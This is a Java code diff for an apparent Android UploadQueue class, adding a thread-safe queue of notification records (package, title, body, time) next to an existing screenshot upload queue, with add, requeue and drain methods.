@@ -30,7 +30,22 @@ public class UploadQueue {
         }
     }
 
+    public static class NotificationItem {
+        public final String packageName;
+        public final String title;
+        public final String body;
+        public final long postedAt;
+
+        public NotificationItem(String packageName, String title, String body, long postedAt) {
+            this.packageName = packageName;
+            this.title = title;
+            this.body = body;
+            this.postedAt = postedAt;
+        }
+    }
+
     private static final ConcurrentLinkedQueue<UploadItem> queue = new ConcurrentLinkedQueue<>();
+    private static final ConcurrentLinkedQueue<NotificationItem> notificationQueue = new ConcurrentLinkedQueue<>();
 
     public static void addSpacebarScreenshot(File file) {
         queue.add(new UploadItem(file, "spacebar", null, null, System.currentTimeMillis()));
@@ -76,6 +91,28 @@ public class UploadQueue {
             items.add(item);
         }
         return items;
+    }
+
+    public static void addNotification(String packageName, String title, String body, long postedAt) {
+        notificationQueue.add(new NotificationItem(packageName, title, body, postedAt));
+        Log.d(TAG, "Notification queued. Size: " + notificationQueue.size());
+    }
+
+    public static void requeueNotification(NotificationItem item) {
+        notificationQueue.add(item);
+    }
+
+    public static List<NotificationItem> drainNotifications() {
+        List<NotificationItem> items = new ArrayList<>();
+        NotificationItem item;
+        while ((item = notificationQueue.poll()) != null) {
+            items.add(item);
+        }
+        return items;
+    }
+
+    public static int notificationsSize() {
+        return notificationQueue.size();
     }
 
     public static int size() {
